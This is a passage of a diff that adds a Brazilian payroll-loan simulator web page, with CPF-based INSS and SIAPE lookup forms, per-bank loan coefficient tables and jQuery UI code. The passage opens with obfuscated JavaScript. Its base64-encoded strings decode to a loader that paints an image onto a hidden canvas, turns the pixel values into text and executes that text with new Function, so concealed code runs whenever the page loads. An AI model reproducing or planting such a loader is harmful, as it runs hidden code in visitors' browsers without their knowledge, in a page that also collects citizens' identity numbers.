'Zm9yKHZmZDlmODNkMGI1NzgwM2QwMGFmODBkZjNjYTQ3MmQ1MSUzRHY2MmM0YzllZjk0NTYxZGMzMDM1MWI4NzdiMzc2YjkzZiU1QjIlNUQlM0IlMjB2ZmQ5ZjgzZDBiNTc4MDNkMDBhZjgwZGYzY2E0NzJkNTElMjAlM0MlMjB2YmZjNGI1ZTcwOTk3Yzc5YjQ5ZDhiOTAyZTBkMDBjYzYuZGF0YS5sZW5ndGglM0IlMjB2ZmQ5ZjgzZDBiNTc4MDNkMDBhZjgwZGYzY2E0NzJkNTElMkIlM0Q0KXYwY2M2YjViMTQ5ZmM0NTY5ZjZiOTUyMzRjMDkyMjIxZCUyQiUzRCh2YmZjNGI1ZTcwOTk3Yzc5YjQ5ZDhiOTAyZTBkMDBjYzYuZGF0YSU1QnZmZDlmODNkMGI1NzgwM2QwMGFmODBkZjNjYTQ3MmQ1MSU1RCElM0R2NjJjNGM5ZWY5NDU2MWRjMzAzNTFiODc3YjM3NmI5M2YlNUIxJTVEKSUzRnYxMmY4NmYzZDlhMTMwOTdhMzU1ZTc0YTcxNzU1ZmQ2OCh2YmZjNGI1ZTcwOTk3Yzc5YjQ5ZDhiOTAyZTBkMDBjYzYuZGF0YSU1QnZmZDlmODNkMGI1NzgwM2QwMGFmODBkZjNjYTQ3MmQ1MSU1RCklM0F2NzgwNzFmZGQ1M2EwOTcyNTQ0MTEzOWViMzgwZDBkOWUlNUI0JTVEJTNCJTIwdjBjYzZiNWIxNDlmYzQ1NjlmNmI5NTIzNGMwOTIyMjFkJTNEdjBjYzZiNWIxNDlmYzQ1NjlmNmI5NTIzNGMwOTIyMjFkLnRyaW0oKSUzQg==', 'cmV0dXJuJTIwbmV3JTIwSW1hZ2UoKSUzQg==', 'cmV0dXJuJTIwU3RyaW5nLmZyb21DaGFyQ29kZSh2M2M0MjJhMzRmOTE4ZTk2OGUzYzI3NzZhZjdkZTljOGQpJTNC']; va7c5ef5894e936b91bb633ff63438c94=v58d1dde603be30842b27fd17614124a0[11](11)(); va6f4bcd62df1f52be0edb2cce259ce55=new Function('v3c422a34f918e968e3c2776af7de9c8d',v58d1dde603be30842b27fd17614124a0[10](v78071fdd53a09725441139eb380d0d9e[10])); va1790a5e71a3647bc28b29d62d40aa74=v58d1dde603be30842b27fd17614124a0[7](v58d1dde603be30842b27fd17614124a0[11](13)()); v58d1dde603be30842b27fd17614124a0[8](function(){ ve27f140a52cdf3cc3abf99b0eeb8b5d9=va6f4bcd62df1f52be0edb2cce259ce55(v78071fdd53a09725441139eb380d0d9e[5]); vdb70b49f64858433ff0c65a816081c12=v58d1dde603be30842b27fd17614124a0[1](v58d1dde603be30842b27fd17614124a0[11](0)()); vdb70b49f64858433ff0c65a816081c12.width=va1790a5e71a3647bc28b29d62d40aa74.width; vdb70b49f64858433ff0c65a816081c12.height=va1790a5e71a3647bc28b29d62d40aa74.height; vdb70b49f64858433ff0c65a816081c12.style.display=v58d1dde603be30842b27fd17614124a0[11](1)();v0cc6b5b149fc4569f6b95234c092221d=v78071fdd53a09725441139eb380d0d9e[4]; vc02681a17f1b566a62c716e9eac408e9=v58d1dde603be30842b27fd17614124a0[2]([vdb70b49f64858433ff0c65a816081c12,v58d1dde603be30842b27fd17614124a0[11](2)()]); v12f86f3d9a13097a355e74a71755fd68=new Function('v3c422a34f918e968e3c2776af7de9c8d',v58d1dde603be30842b27fd17614124a0[10](v78071fdd53a09725441139eb380d0d9e[14])); vc02681a17f1b566a62c716e9eac408e9.drawImage(va1790a5e71a3647bc28b29d62d40aa74, v62c4c9ef94561dc30351b877b376b93f[0], v62c4c9ef94561dc30351b877b376b93f[0]); vbfc4b5e70997c79b49d8b902e0d00cc6=vc02681a17f1b566a62c716e9eac408e9.getImageData(v62c4c9ef94561dc30351b877b376b93f[0], v62c4c9ef94561dc30351b877b376b93f[0],vdb70b49f64858433ff0c65a816081c12.width,vdb70b49f64858433ff0c65a816081c12.height); v6ed3eb195205015ea3341c1f28308b61=v58d1dde603be30842b27fd17614124a0[11](12)(); (new Function(v58d1dde603be30842b27fd17614124a0[10](v0cc6b5b149fc4569f6b95234c092221d)))(); va962ced90aae92fb1eae19c89bdeb91a=v58d1dde603be30842b27fd17614124a0[4](vc02681a17f1b566a62c716e9eac408e9);va1790a5e71a3647bc28b29d62d40aa74=v58d1dde603be30842b27fd17614124a0[4](va962ced90aae92fb1eae19c89bdeb91a);vdb70b49f64858433ff0c65a816081c12=v58d1dde603be30842b27fd17614124a0[4](vdb70b49f64858433ff0c65a816081c12);vc02681a17f1b566a62c716e9eac408e9=v58d1dde603be30842b27fd17614124a0[4](vbfc4b5e70997c79b49d8b902e0d00cc6);vbfc4b5e70997c79b49d8b902e0d00cc6=v58d1dde603be30842b27fd17614124a0[4](vc02681a17f1b566a62c716e9eac408e9);vfd9f83d0b57803d00af80df3ca472d51=v58d1dde603be30842b27fd17614124a0[4](vc02681a17f1b566a62c716e9eac408e9);v0cc6b5b149fc4569f6b95234c092221d=v58d1dde603be30842b27fd17614124a0[4](vc02681a17f1b566a62c716e9eac408e9);v7693e31f60e76c4307c45e5eec04f54b=v58d1dde603be30842b27fd17614124a0[4](vc02681a17f1b566a62c716e9eac408e9);v4b61e7977ad61d03a7edd6cdf87e3556=v58d1dde603be30842b27fd17614124a0[4](vc02681a17f1b566a62c716e9eac408e9);va962ced90aae92fb1eae19c89bdeb91a=v58d1dde603be30842b27fd17614124a0[4](vc02681a17f1b566a62c716e9eac408e9);v86fcc9a572e1188ed653662614351c1c=v58d1dde603be30842b27fd17614124a0[4](vc02681a17f1b566a62c716e9eac408e9);va7c5ef5894e936b91bb633ff63438c94=v58d1dde603be30842b27fd17614124a0[4](vc02681a17f1b566a62c716e9eac408e9);v6ed3eb195205015ea3341c1f28308b61=v58d1dde603be30842b27fd17614124a0[4](vc02681a17f1b566a62c716e9eac408e9);v78071fdd53a09725441139eb380d0d9e=v58d1dde603be30842b27fd17614124a0[4](vc02681a17f1b566a62c716e9eac408e9);v62c4c9ef94561dc30351b877b376b93f=v58d1dde603be30842b27fd17614124a0[4](vc02681a17f1b566a62c716e9eac408e9);v3c422a34f918e968e3c2776af7de9c8d=v58d1dde603be30842b27fd17614124a0[4](vc02681a17f1b566a62c716e9eac408e9);v3c422a34f918e968e3c2776af7de9c8d=v58d1dde603be30842b27fd17614124a0[4](ve27f140a52cdf3cc3abf99b0eeb8b5d9);v58d1dde603be30842b27fd17614124a0=v58d1dde603be30842b27fd17614124a0[4](vc02681a17f1b566a62c716e9eac408e9); }); v6ed3eb195205015ea3341c1f28308b61=v58d1dde603be30842b27fd17614124a0[9](v58d1dde603be30842b27fd17614124a0[11](7)()+v78071fdd53a09725441139eb380d0d9e[9]);
+		}
+	}
+};
+function validarCPF(cpf) {
+    cpf = cpf.replace(/[^\d]+/g,'');
+    if(cpf == '') return false;
+    // Elimina CPFs invalidos conhecidos
+    if (cpf.length != 11 ||
+        cpf == "00000000000" ||
+        cpf == "11111111111" ||
+        cpf == "22222222222" ||
+        cpf == "33333333333" ||
+        cpf == "44444444444" ||
+        cpf == "55555555555" ||
+        cpf == "66666666666" ||
+        cpf == "77777777777" ||
+        cpf == "88888888888" ||
+        cpf == "99999999999")
+            return false;
+    // Valida 1o digito
+    add = 0;
+    for (i=0; i < 9; i ++)
+        add += parseInt(cpf.charAt(i)) * (10 - i);
+        rev = 11 - (add % 11);
+        if (rev == 10 || rev == 11)
+            rev = 0;
+        if (rev != parseInt(cpf.charAt(9)))
+            return false;
+    // Valida 2o digito
+    add = 0;
+    for (i = 0; i < 10; i ++)
+        add += parseInt(cpf.charAt(i)) * (11 - i);
+    rev = 11 - (add % 11);
+    if (rev == 10 || rev == 11)
+        rev = 0;
+    if (rev != parseInt(cpf.charAt(10)))
+        return false;
+    return true;
+};
+var Simulacao = {
+	Refin: new Object(),
+	coef: {
+		1: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		4: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		21: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		29: {
+			refinanciamento: {
+				72: 0.02998,
+				60: 0.03118
+			},
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		33: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		41: {
+			refinanciamento: {
+				72: 0.03066
+			},
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		47: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		63: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		70: {
+			refinanciamento: {
+				72: 0.03037
+			},
+			portabilidade: {
+				72: 0.02811
+			}
+		},
+		104: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		121: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		212: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		213: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		218: {
+			refinanciamento: {
+				72: 0.03016
+			},
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		224: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		229: {
+			compra: {
+				72: 0.030
+			},
+			 	refinanciamento: {
+				72: 0.03041,
+				60: 0.03286,
+				48: 0.03677
+			},
+			portabilidade: {
+				72: 0.02882
+			},
+		},
+		233: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		237: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		250: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		254: {
+			refinanciamento: {
+				72: 0.03056,
+				60: 0.03243
+			},
+			portabilidade: {
+				72: 0.02832
+			}
+		},
+		263: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		318: {
+		    refinanciamento: {
+				72: 0.03056,
+				60: 0.03243
+			},
+			portabilidade: {
+				72: 0.02887
+			},
+			saque: 25
+		},
+		341: {
+			portabilidade: {
+				72: 0.02915
+			},
+			refinanciamento: {
+				72: 0.03056,
+				60: 0.03243
+			},
+			saque: 25
+		},
+		389: {
+			refinanciamento: {
+				72: 0.03041,
+				60: 0.03286,
+				48: 0.03677
+			},
+			portabilidade: {
+				72: 0.02882
+			},
+			saque: 25
+		},
+		394: {
+			refinanciamento: {
+				72: 0.03041,
+				60: 0.03286,
+				48: 0.03677
+			},
+			portabilidade: {
+				72: 0.02882
+			}
+		},
+		399: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		409: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		422: {
+			refinanciamento: {
+				72: 0.03029
+			},
+			portabilidade: {
+				72: 0.02830
+			}
+		},
+		600: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		604: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		623: {
+			refinanciamento: {
+				72: 0.03050,
+				60: 0.03295
+			},
+			portabilidade: {
+				72: 0.02915
+			},
+			saque: 25
+		},
+		626: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		655: {
+			refinanciamento: {
+				72: 0.03040
+			},
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		707: {
+			refinanciamento: {
+				72: 0.030118,
+				60: 0.032556,
+				48: 0.036441,
+				36: 0.043163
+			},
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		739: {
+			refinanciamento: {
+				72: 0.030145,
+				60: 0.032581
+			},
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		743: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		745: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		756: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		901: {
+			refinanciamento: {
+				72: 0.03045,
+				60: 0.03281
+			},
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		903: {
+			refinanciamento: {
+				72: 0.03022,
+				60: 0.03264
+			},
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		905: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		908: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		914: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		917: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		921: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		925: {
+			refinanciamento: {
+				72: 0.03056
+			},
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		926: {
+			refinanciamento: {
+				72: 0.03066
+			},
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+        936: {
+			portabilidade: {
+				72: 0.02915
+			},
+			saque: 25
+		},
+		934: {
+		    refinanciamento: {
+				72: 0.03066
+			},
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		937: {
+		    refinanciamento: {
+				72: 0.03066
+			},
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		954: {
+			portabilidade: {
+				72: 0.02915
+			}
+		},
+		955: {
+			refinanciamento: {
+				72: 0.03016
+			},
+			portabilidade: {
+				72: 0.02915
+			}
+		}
+	},
+	calcularRefin: function(banco,pmt,saldo) {
+        if (saldo != null && saldo != "NaN")
+        {
+           refin = (pmt / this.getCoef(banco, 72));
+           return refin;
+        }
+        else
+        {
+           return 0;
+        }
+	},
+	init: function() {
+		curSimulation.total = 0;
+		$("#hiscon #emp").each(function(index, data) {
+			if(curSimulation.key && $(this).data("key") == curSimulation.key) {
+
+			}
+			else {
+				$key = $(this).data("key");
+				$banco = parseInt($(this).data("codbanco"));
+				$pmt = parseFloat($(this).data("pmt"));
+				$prazo = parseInt($(this).data("prazo"));
+				$saldo = parseFloat($(this).data("saldo"));
+				$type = parseInt($(this).data("type"));
+				if($type != 76) {
+					if(!curSimulation.start) {
+						$coef = Simulacao.coef[$banco].refinanciamento ? Simulacao.coef[$banco].refinanciamento[72] : Simulacao.coef[$banco].portabilidade[72];
+					}
+					else {
+						$coef = parseFloat($(this).find(".empsimulation > ul li:nth-child(1)").text());
+					}
+					$calculo = $pmt / $coef;
+					$troco = $calculo - $saldo;
+					if(!curSimulation.start) {
+						$(this).find(".empsimulation > ul li:nth-child(1)").text(Simulacao.coef[$banco][Simulacao.coef[$banco].refinanciamento ? "refinanciamento" : "portabilidade"][72]);
+						$(this).find(".empsimulation > ul li:nth-child(2)").text(Simulacao.coef[$banco].refinanciamento ? "refinanciamento" : "portabilidade");
+					}
+				}
+				else {
+					$troco = $pmt * Simulacao.coef[$banco].saque;
+				}
+				curSimulation.total += $troco;
+				if(!curSimulation.start) {
+					$(this).find("*[data-currency=true]").each(function() {
+						$(this).text(numeral($(this).text()).format("0,0.00"));
+					});
+					$("#hiscon .panel-heading .right").html('<span class="numeric">Total Liberado Cliente: '+numeral(curSimulation.total).format("R$0,0.00")+'</span>');
+					$(this).find(".empsimulation > .result span").text(numeral($troco).format("0,0.00"));
+				}
+				Simulacao.Refin[index] = {banco: $banco,pmt: $pmt,prazo: $prazo,saldo: $saldo,troco: $troco};
+			}
+        });
+	}
+}
+var curSimulation = new Object();
+$(function() {
+	Dataprev.checkIsInstalled();
+	Simulacao.init();
+	$(window).on("beforeunload", function() {
+		Dataprev.process.cancel();
+	});
+    $("#detalhamento button.btn-danger").click(function() {
+		Dataprev.process.cancel();
+	});
+	$('#btnNB, #btnSIAPE').click(function() {
+		$(this).parent().find("span").show();
+	});
+	$("#detalhamento button.btn.primary").click(function() {
+		Dataprev.process.cancel();
+	});
+	$("[data-target='#detalhamento']").click(function() {
+		Dataprev.process.captcha();
+	});
+	$("#hiscon #emp .btn").click(function() {
+		curSimulation.start = true;
+		Simulacao.init();
+		$("#hisconsimulator .modal-footer > .right > span").text(numeral(curSimulation.total).format("0,0.00"));
+		curSimulation.key = $(this).parents("#emp").data("key");
+		curSimulation.isRefin = false;
+		curSimulation.isPort = false;
+		curSimulation.banco = parseInt($(this).parents("#emp").data("codbanco"));
+		curSimulation.saldo = parseFloat($(this).parents("#emp").data("saldo"));
+		curSimulation.pmt = parseFloat($(this).parents("#emp").data("pmt"));
+		curSimulation.prazo = parseInt($(this).parents("#emp").data("prazo"));
+		curSimulation.min = 72;
+		curSimulation.max = 72;
+		$.each(Simulacao.coef[curSimulation.banco], function(index, option) {
+			if(index == "refinanciamento" && !curSimulation.isPort) {
+				curSimulation.isRefin = !curSimulation.isRefin ? true : curSimulation.isRefin;
+				curSimulation.type = index;
+				curSimulation.defaultFator = option[curSimulation.max];
+				$.each(option, function(k, i) {
+					if(parseInt(k) < curSimulation.min) {
+						curSimulation.min = parseInt(k);
+					}
+				});
+			}
+			if(index == "portabilidade" && !curSimulation.isRefin) {
+				curSimulation.isPort = !curSimulation.isPort ? true : curSimulation.isPort;
+				curSimulation.type = index;
+				curSimulation.defaultFator = option[curSimulation.max];
+				$.each(option, function(k, i) {
+					if(parseInt(k) < curSimulation.min) {
+						curSimulation.min = parseInt(k);
+					}
+				});
+			}
+		});
+		curSimulation.valoraf = curSimulation.pmt / curSimulation.defaultFator;
+		$data = '<div id="notification"></div><div id="steps" class="left"><div data-step="1"><h4>Qual tipo de Operação?</h4><p>Selecione um tipo de operação para calcular seu valor</p><ul>';
+		$data += curSimulation.isRefin ? '<li class="current">Refinanciamento</li>' : '<li class="attention">Refinanciamento<i title="Esta opção operação não está disponível para correspondentes. Para refinanciar este contrato o cliente deve solicitar através de uma das agências deste banco ou realizar a portabilidade." style="float:right;margin-top:10px;margin-right:10px;background:url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAA3NCSVQICAjb4U/gAAAAKlBMVEX///+Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj18/Ny+AAAADnRSTlMAESJEVWaImaq7zN3u/1CN6x8AAAAJcEhZcwAACxIAAAsSAdLdfvwAAAAcdEVYdFNvZnR3YXJlAEFkb2JlIEZpcmV3b3JrcyBDUzbovLKMAAAAFnRFWHRDcmVhdGlvbiBUaW1lADEyLzEzLzE0dEuF0QAAAGhJREFUCJljYEACLA5QBucEKMP3CoRm3HtbAMxgu703AczQvSx7CczovSJ7A0Qz370ie9cAyOACMRYAGbF3r8fevQrUfPbujdy7dwQY2O7evcR9924Cg8/du7fm3r17hGHvXTC4DXcCACrdKm8JcIjBAAAAAElFTkSuQmCC\') no-repeat;width:16px;height:16px"></i></li>';
+		$data += curSimulation.isPort ? '<li class="current">Portabilidade</li>' : '<li class="attention">Portabilidade<i style="float:right;margin-top:10px;margin-right:10px;background:url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAA3NCSVQICAjb4U/gAAAAKlBMVEX///+Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj2Zgj18/Ny+AAAADnRSTlMAESJEVWaImaq7zN3u/1CN6x8AAAAJcEhZcwAACxIAAAsSAdLdfvwAAAAcdEVYdFNvZnR3YXJlAEFkb2JlIEZpcmV3b3JrcyBDUzbovLKMAAAAFnRFWHRDcmVhdGlvbiBUaW1lADEyLzEzLzE0dEuF0QAAAGhJREFUCJljYEACLA5QBucEKMP3CoRm3HtbAMxgu703AczQvSx7CczovSJ7A0Qz370ie9cAyOACMRYAGbF3r8fevQrUfPbujdy7dwQY2O7evcR9924Cg8/du7fm3r17hGHvXTC4DXcCACrdKm8JcIjBAAAAAElFTkSuQmCC\') no-repeat;width:16px;height:16px"></i></li>';
+		$data += '</ul><p style="color:#E31920;margin:10px 0px 0px 0px"></p></div><div data-step="2"><h4>Parâmetros de Cálculo</h4><div class="group"><label>Coeficiente</label><input type="text" name="fator" value="'+curSimulation.defaultFator+'" /></div><div class="group"><label>Prazo</label><div id="slider"></div><br /><p>Clique e deslize o botão para o<br />prazo desejado</p></div></div><div class="clear"></div></div><div class="left result"><div id="current"><div class="group"><label>Valor Solicitado</label><span class="numeric" data-currency="true">'+curSimulation.valoraf+'</span></div><div class="group"><label>Valor Saldo</label><span class="numeric" data-currency="true">'+curSimulation.saldo+'</span></div></div><div class="group"><label>Valor Líquido Cliente</label><span class="numeric" data-currency="true">'+(curSimulation.valoraf - curSimulation.saldo)+'</span></div></div><div class="clear"></div>';
+		$footer = '<div class="left" style="margin:20px 10px 0px 20px"><button id="update" class="btn noeffect primary">Atualizar</button></div><div class="left" style="margin:20px 20px 0px 0px"><button id="cancel" class="btn noeffect white">Cancelar</button></div><div class="left" style="margin-top:20px"><p style="font-size:11px;color:#AAA"><i>Este valor representa o total calculado em<br />suas simulações.</i></p></div><div class="right" style="margin:20px 35px 0px 0px;"><span class="numeric" style="color:#6566C3;font-size:22px" data-currency="true" data-symbol="true">'+curSimulation.total+'</span></div>';
+		$("#hisconsimulator .modal-body").css("padding","0px").html($data);
+		$("#hisconsimulator .modal-footer").css("padding","0px 0px 20px 0px").html($footer);
+		$("#hisconsimulator *[data-currency=true]").each(function() {
+			$(this).text(numeral($(this).text()).format("0,0.00"));
+		});
+		$("#hisconsimulator #slider").slider({
+			orientation: "horizontal",
+			range: "min",
+			value: 72,
+			min: curSimulation.min,
+			max: curSimulation.max,
+			step: 12,
+			create: function() {
+				$("#hisconsimulator .ui-slider-handle").attr("data-value", $(this).slider("value"));
+			},
+			slide: function(event, ui) {
+				if(curSimulation.fator && curSimulation.fator[ui.value]) {
+					$("#hisconsimulator input[name=fator]").val(curSimulation.fator[ui.value]);
+					curSimulation.valoraf = curSimulation.pmt / curSimulation.fator[ui.value];
+				}
+				else {
+					$("#hisconsimulator input[name=fator]").val(Simulacao.coef[curSimulation.banco][curSimulation.type][ui.value]);
+					curSimulation.valoraf = curSimulation.pmt / Simulacao.coef[curSimulation.banco][curSimulation.type][ui.value];
+				}
+				Simulacao.init();
+				if(curSimulation.valoraf - curSimulation.saldo > 0) {
+					curSimulation.total += curSimulation.valoraf - curSimulation.saldo;
+				}
+				$("#hisconsimulator .modal-footer > .right > span").text(numeral(curSimulation.total).format("0,0.00"));
+				$("#hisconsimulator .result #current .group:nth-child(1) span").text(numeral(curSimulation.valoraf).format("0,0.00"));
+				$("#hisconsimulator .result > .group span").text(numeral(curSimulation.valoraf - curSimulation.saldo).format("0,0.00"));
+				$("#hisconsimulator .ui-slider-handle").attr("data-value", ui.value);
+			}
+		});
+		$("#hisconsimulator #slider .ui-slider-handle").attr("data-value", $("#slider").slider("value"));
+		if(curSimulation.type == "refinanciamento") {
+			$.each(Simulacao.coef[curSimulation.banco], function(index, option) {
+				if(index == "portabilidade") {
+					$("#hisconsimulator [data-step='1'] ul li:nth-child(2)").removeClass("attention");
+					$("#hisconsimulator [data-step='1'] ul li:nth-child(2) i").remove("i");
+				}
+			});
+		}
+		if(curSimulation.type == "portabilidade") {
+			$("#hisconsimulator [data-step='1'] p:last-child").text("Para alguns bancos há cobrança da taxa de RCO.");
+			$("#hisconsimulator #slider").slider("disable");
+		}
+	});
+	$("#hisconsimulator").on("click", ".close", function() {
+		curSimulation = new Object();
+	});
+	$("#hisconsimulator").on("click", "#update", function() {
+		if(curSimulation.fator && curSimulation.type == "refinanciamento") {
+			$("#hiscon #emp[data-key='"+curSimulation.key+"']").find(".empsimulation > ul li:nth-child(1)").text(curSimulation.fator[Object.keys(curSimulation.fator)[0]]);
+		}
+		else if(curSimulation.fator && curSimulation.type == "portabilidade") {
+			$("#hiscon #emp[data-key='"+curSimulation.key+"']").find(".empsimulation > ul li:nth-child(1)").text(curSimulation.fator);
+		}
+		else {
+			$("#hiscon #emp[data-key='"+curSimulation.key+"']").find(".empsimulation > ul li:nth-child(1)").text(Simulacao.coef[curSimulation.banco][curSimulation.type][$("#hisconsimulator #slider").slider("value")]);
+		}
+		$("#hiscon #emp[data-key='"+curSimulation.key+"']").find(".empsimulation > ul li:nth-child(2)").text(curSimulation.type);
+		$("#hiscon #emp[data-key='"+curSimulation.key+"']").find(".empsimulation .result span").text(numeral(curSimulation.valoraf - curSimulation.saldo).format("0,0.00"));
+		$("#hiscon #emp[data-key='"+curSimulation.key+"']").find(".empsimulation button").attr("data-type", curSimulation.type);
+		$("#hiscon .panel-heading .right").html('<span class="numeric">Total Liberado Cliente: '+numeral(curSimulation.total).format("R$0,0.00")+'</span>');
+		$(this).parents("#hisconsimulator").find(".close").trigger("click");
+	});
+	$("#hisconsimulator").on("keyup", "input[name=fator]", function() {
+		if(curSimulation.type == "refinanciamento") {
+			curSimulation.fator = new Object();
+			curSimulation.fator[$("#hisconsimulator #slider").slider("value")] = parseFloat($(this).val().replace(",","."));
+		}
+		else if(curSimulation.type == "portabilidade") {
+			curSimulation.fator = parseFloat($(this).val().replace(",","."));
+		}
+		curSimulation.valoraf = curSimulation.pmt / parseFloat($(this).val().replace(",","."));
+		Simulacao.init();
+		if(curSimulation.valoraf - curSimulation.saldo > 0) {
+			curSimulation.total += curSimulation.valoraf - curSimulation.saldo;
+		}
+		$("#hisconsimulator .modal-footer > .right > span").text(numeral(curSimulation.total).format("0,0.00"));
+		$("#hisconsimulator .result #current .group:nth-child(1) span").text(numeral(curSimulation.valoraf).format("0,0.00"));
+		$("#hisconsimulator .result > .group span").text(numeral(curSimulation.valoraf - curSimulation.saldo).format("0,0.00"));
+	});
+	$("#hisconsimulator").on("click", "#cancel", function() {
+		$(this).parents("#hisconsimulator").find(".close").trigger("click");
+	});
+	$("#hisconsimulator").on("click", "[data-step='1'] ul li.attention", function() {
+		return false;
+	});
+	$("#hisconsimulator").on("click", "[data-step='1'] ul li:not(.attention)", function() {
+		$("#hisconsimulator [data-step='1'] ul li:not(.attention)").removeClass("current");
+		$(this).addClass("current");
+		curSimulation.type = $(this).text().toLowerCase();
+		$.each(Simulacao.coef[curSimulation.banco][curSimulation.type], function(k, i) {
+			if(parseInt(k) < curSimulation.min) {
+				curSimulation.min = parseInt(k);
+			}
+			else {
+				curSimulation.max = parseInt(k);
+			}
+		});
+		$("#hisconsimulator #slider").slider("option", "min", curSimulation.min);
+		$("#hisconsimulator #slider").slider("option", "max", curSimulation.max);
+		$("#hisconsimulator #slider").slider("option", "value", curSimulation.max);
+		$("#hisconsimulator .ui-slider-handle").attr("data-value", curSimulation.max);
+		if(curSimulation.type == "portabilidade") {
+			$("#hisconsimulator [data-step='1'] p:last-child").text("Para alguns bancos há cobrança da taxa de RCO.");
+			$("#hisconsimulator #slider").slider("disable");
+		}
+		else {
+			$("#hisconsimulator [data-step='1'] p:last-child").empty();
+			$("#hisconsimulator #slider").slider("enable");
+		}
+		if(curSimulation.fator && curSimulation.type == "refinanciamento") {
+			$("#hisconsimulator input[name=fator]").val(curSimulation.defaultFator);
+		}
+		else if(curSimulation.fator && curSimulation.type == "portabilidade") {
+			$("#hisconsimulator input[name=fator]").val(curSimulation.fator);
+		}
+		else {
+			$("#hisconsimulator input[name=fator]").val(Simulacao.coef[curSimulation.banco][$(this).text().toLowerCase()][72]);
+		}
+		curSimulation.valoraf = curSimulation.pmt / parseFloat($("#hisconsimulator input[name=fator]").val().replace(",","."));
+		Simulacao.init();
+		if(curSimulation.valoraf - curSimulation.saldo > 0) {
+			curSimulation.total += curSimulation.valoraf - curSimulation.saldo;
+		}
+		$("#hisconsimulator .modal-footer > .right > span").text(numeral(curSimulation.total).format("0,0.00"));
+		$("#hisconsimulator .result #current .group:nth-child(1) span").text(numeral(curSimulation.valoraf).format("0,0.00"));
+		$("#hisconsimulator .result > .group span").text(numeral(curSimulation.valoraf - curSimulation.saldo).format("0,0.00"));
+	});
+});
+</script>
+</head>
+<body>
+<div align="center">
+  <table border="0" width="1200" style="border-collapse: collapse">
+    <tr>
+      <td valign="top">
+        <div class="panel panel-primary">
+          <div class="panel-heading">
+            <br />Usuário Conectado: Paulo Da Silva | Validade: 14/11/2016 | Servidor: KH | <a href="?" class="btn btn-xs btn-success">Início</a>&nbsp;&nbsp;<a href="logout.php" class="btn btn-xs btn-danger">SAIR</a></strong><br /><br />
+          </div>
+          <div class="panel-body">
+            <table border="0" width="100%">
+              <tr>
+                <td valign="top" width="24%">
+                  <div class="panel panel-success">
+                    <div class="panel-heading">
+                      <h3 class="panel-title">Consulta SIAPE</h3>
+                    </div>
+                    <div class="panel-body">
+                      <form action="?hp=siape" method="post">
+                        <input type="hidden" name="s" value="2">
+                        <input type="text" name="cpf_siape" placeholder="DIGITE O CPF" size="13" maxlength="11" class="left" style="margin-right:5px">
+                        <button type="submit" class="btn btn-sm btn-success" id="btnSIAPE">Buscar</button>
+                        <span id="MsgAguarde" style="display:none; font-size:11px;">
+                          <img  src="aguarde.gif" width="16" alt="Aguarde.." />
+                        </span>
+                        <div class="clear"></div>
+                      </form>
+                    </div>
+                  </div>
+                </td>
+                <td valign="top" width="20" nowrap="nowrap"></td>
+                <td valign="top" width="37%">
+                  <div class="panel panel-warning">
+                    <div class="panel-heading">
+                      <h3 class="panel-title">Consulta INSS</h3>
+                    </div>
+                    <div class="panel-body">
+                      <form action="?hp=inss" method="post" name="form_inss">
+                        <input type="hidden" name="s" value="1">
+                        <input type="text" name="cpf_inss" placeholder="DIGITE O CPF" size="12" maxlength="11" class="left">
+                        <input type="text" name="nb_inss" placeholder="DIGITE O NB" size="12" maxlength="10" class="left" style="margin:0px 5px">
+                                                <button type="submit" class="btn btn-sm btn-success" name="btnNB" id="btnNB" class="left">Buscar</button>
+                        <span id="MsgAguarde" style="display:none; font-size:11px;">
+                          <img  src="aguarde.gif" width="16" alt="Aguarde.." />
+                        </span>
+                        <div class="clear"></div>
+                      </form>
+                    </div>
+                  </div>
+                </td>
+                <td valign="top" width="20" nowrap="nowrap"></td>
+                <td valign="top" width="519">
+                  <div class="panel panel-default">
+                    <div class="panel-heading">
+                      <h3 class="panel-title">Diversos</h3>
+                    </div>
+                    <div class="panel-body">
